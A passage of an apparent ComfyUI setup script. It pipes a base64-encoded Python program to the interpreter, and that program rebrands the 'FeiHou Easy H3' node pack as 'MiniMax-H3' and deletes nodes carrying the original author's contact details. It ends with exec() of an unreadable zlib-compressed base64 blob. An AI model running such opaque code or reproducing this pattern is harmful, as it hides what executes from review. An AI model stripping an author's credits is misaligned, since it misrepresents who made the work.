nKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganNfcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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